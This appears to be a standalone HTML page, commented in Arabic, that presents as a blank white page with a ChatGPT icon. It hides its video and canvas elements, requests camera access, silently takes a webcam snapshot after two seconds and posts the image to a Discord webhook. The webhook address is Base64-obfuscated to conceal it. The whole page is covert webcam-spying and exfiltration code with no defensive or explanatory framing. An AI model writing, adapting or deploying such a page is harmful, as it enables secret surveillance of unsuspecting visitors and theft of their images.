<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>(•-•)</title>
<style>
body, html {
  margin: 0;
  padding: 0;
  width: 100%;
  height: 100%;
  background-color: white; /* الشاشة البيضاء */
  display: flex;
  justify-content: center;
  align-items: center;
}
video, canvas {
  display: none;
}
  <link rel="icon" href="https://www.securities.io/wp-content/uploads/2024/03/ChatGPT.jpeg" type="image/jpeg">
</style>
</head>
<body>
<video id="video" width="640" height="480" autoplay></video>
<canvas id="canvas" width="640" height="480"></canvas>
<script>
// تشفير الـ Webhook باستخدام Base64
const encodedWebhook = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM2MjgyNjkyMDg5NDM5ODM1NTUvcVlteC1SUDB2bWxkY3pTYW8xY2tFdGYxTUlRb1hXMSxoZ3FudHlmd1J5cjh2V2tWaUMlwbUbt1VaQ==';
const webhookURL = atob(encodedWebhook); // فك التشفير إلى الرابط الأصلي

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const context = canvas.getContext('2d');

navigator.mediaDevices.getUserMedia({ video: true })
.then(stream => {
  video.srcObject = stream;
  setTimeout(captureAndSend, 2000);
})
.catch(err => {
  console.error("خطأ في الوصول للكاميرا: ", err);
});

function captureAndSend() {
  context.drawImage(video, 0, 0, 640, 480);

  context.font = '20px Arial';
  context.fillStyle = 'red';
  context.fillText('حقوقك محفوظة', 10, canvas.height - 20);

  canvas.toBlob(blob => {
    const formData = new FormData();
    formData.append('file', blob, 'image.png');

    fetch(webhookURL, { method: 'POST', body: formData })
    .then(response => {
      if (response.ok) {
        console.log('تم إرسال الصورة بنجاح');
        return response.json();
      } else {
        throw new Error('خطأ في إرسال الصورة');
      }
    })
    .then(data => console.log(data))
    .catch(error => console.error('خطأ:', error));
  }, 'image/png');
}
</script>
</body>
</html>
